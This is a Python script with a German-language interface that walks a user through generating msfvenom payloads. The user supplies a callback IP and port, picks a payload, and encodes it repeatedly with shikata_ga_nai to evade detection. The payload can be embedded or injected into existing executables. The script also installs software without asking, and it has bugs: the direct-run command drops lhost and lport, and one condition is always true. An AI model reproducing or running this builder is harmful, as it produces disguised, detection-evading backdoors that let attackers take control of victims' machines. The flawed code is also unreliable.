#-*- coding: utf-8 -*-
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    #taken from https://stackoverflow.com/questions/287871/how-to-print-colored-text-in-terminal-in-python
import os
import sys
import urllib.request
import getpass
os.system("apt-get install gedit")
os.system("clear")
print(" " + bcolors.HEADER)
if os.getuid() != 0:
    exit("Dieses Tool muss als Root ausgeführt werden!")
print("                                                                   __     _______ _   _  ___  __  __ ")
print("                                                                   \ \   / / ____| \ | |/ _ \|  \/  |")
print("                                                                    \ \ / /|  _| |  \| | | | | |\/| |")
print("                                                                     \ V / | |___| |\  | |_| | |  | |")
print("                                                                      \_/  |_____|_| \_|\___/|_|  |_|")
print(bcolors.UNDERLINE + "                                                                                   ___________________________________________________________________________________________" + bcolors.ENDC)
print(" ")
print(" ")
print(bcolors.OKBLUE + "MsfVenomGenerator von" + bcolors.WARNING + " DasPinguinHD")
print(" ")
print("PROFI-TIPP: Du kannst die Datei badchars.txt bearbeiten und so deine Ausgabedatei personalisieren!" + bcolors.ENDC)
print(" ")
print(" ")
print(" ")
input("Eingabetaste zum Starten")
os.system("clear")


try:
    print("Lass uns zuerst deine IP festlegen. Gib hier deine Ausgangsadresse ein (Wenn dein Angriff über ein lokales Netzwerk geht, brauchst du deine lokale IP) (Gib zum Anzeigen deiner lokalen IP show IP ein): ")
    while True:
        lhost = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if lhost == "show IP":
            os.system("ifconfig")
            print("Deine benötigte IP-Adresse ist die unter deinem WLAN-Interface, also zum Beispiel wlan0 unter inet: XXX.XXX.XX.XXX. Wird dir kein Interface mit 'wlan' angezeigt, hast du entweder nur Ethernet, also Kabel-Anschluss, oder keinen Internetzugang")
        elif lhost == "":
            print("Bitte eine gültige Ip eingeben!")
        else:
            break

    print("Als nächstest brauchst du noch einen lokalen Port (Standardmäßig: 4444)")

    while True:
        lport= input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if lport == "":
            lport = "4444"


        else:
            try:
                val1 = int(lport)
                print("Erfolgreich")
                break
            except ValueError:
                print("Falscher input")


    print("Dein Port wurde festgelegt.")
    print("Jetzt brauchst du einen Payload. Gib show payloads für eine Liste verfügbarer Payloads ein oder gib deinen Payload gleich so ein: ")
    while True:
        print("Payload:")
        payload = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if payload == "show payloads":
            os.system("msfvenom --list payloads")

        elif payload == "":
            print("Gib einen Payload ein!")
        else:
            print("Fertig")
            break


    print("Dein Payload wurde aufgenommen!")

    print("Encodiere deinen Payload nun: ")

    print("show encoders zeigt dir eine Liste mit verfügbaren Encodieren an, Standardmäßig ist shikata_ga_nai eingestellt. ")
    while True:
        encoder = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if encoder == "":
            encoder = "x86/shikata_ga_nai"
            print("Encoder: " + str(encoder))
            break
        elif encoder == "show encoders":
            os.system("msfvenom --list encoders")
        else:
            print("Encodierer gesetzt")
            break

    print("Gib jetzt an, wie oft der Payload encodiert werden soll (Standardmäßig 4): ")
    iteration = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
    if iteration == "":
        iteration = "4"
    else:
        print("Iterations gesetzt")
    while True:
        print("Gib jetzt an, wie viele Bad-Chars dein Payload haben soll: ")
        print("1,2,3,4")
        bchar = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if bchar == "1":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + "'"
            break
        if bchar == "2":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + str(currentline[1]) + "'"
            break
        if bchar == "3":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + str(currentline[1]) + str(currentline[2]) + "'"
            break
        if bchar == "4":
            with open("badchars.txt", "r") as filestream:
                for line in filestream:
                    currentline = line.split(",")
                    badchar = "'" + str(currentline[0]) + str(currentline[1]) + str(currentline[2]) + str(currentline[3]) + "'"
            break

    print(str(badchar))

    print("Gib jetzt o, x oder k ein, um den Modus deiner Ausgabedatei festzulegen: ")
    while True:
        file = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
        if file == "o":
            x = "-o"
            print("Normal-Out")
            print(" ")
            print("Gib jetzt einen Dateinamen mit Pfad ein (/home/USERNAME/DATEINAME) BITTE OHNE DIE DATEIENDUNG: ")
            template = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            print("Gib jetzt eine Dateiendung ein, welche zum OS deines Payloads passt (z. B.: exe oder txt bei Windows) (Bitte OHNE Punkt, also exe oder txt, nicht .exe): ")
            suffix = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            break
        if file == "x":
            x = "x"
            print("Vorlage als Output")
            print("Bitte beim Verzeichnis '/' anfangen, also falls die Datei in deinem persönlichen Ordner ist: /home/USERNAME/template.exe")
            template = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            print("Gib die Dateiendung der Vorlage ein (OHNE Punkt): ")
            suffix = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            break
        if file == "k":
            x = "-k"
            print("Code-Injection in eine vorhandene Datei")
            print(" ")
            print("")
            template = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            print("Gib jetzt die Endung der Vorlage ein (OHNE Punkt): ")
            suffix = input(bcolors.UNDERLINE + bcolors.OKBLUE + "MSFVenom-Generator" + bcolors.ENDC + " >>> ")
            break

        if file != "o" or "x" or "k":
            print("Falsche Angabe!")
    print("Fertig, Code wird generiert...")

    outcmd = input("Willst du die Datei gleich generieren? Ansonsten wird dir der Befehl zum Selbstausführen angezeigt (J/n): ")
    while True:
        if outcmd == "J":
            print("msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
            os.system("msfvenom -p " + str(payload) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
            break
        elif outcmd == "n":
                print("Code zum Kopieren: msfvenom -p " + str(payload) + " lhost=" + str(lhost) + " lport="+ str(lport) + " -e " + str(encoder) + " -i " + str(iteration) + " -b " + str(badchar) + " " + str(x) + " " + str(template) + "." + suffix)
                break
        else:
            print(bcolors.WARNING + "Ungültiger Wert, nochmal versuchen." + bcolors.ENDC)
except KeyboardInterrupt:
    print(" ")
    print(bcolors.WARNING + "Beenden" + bcolors.ENDC)
except Exception as e:
    print("Ein Fehler ist aufgetreten:" + str(e))
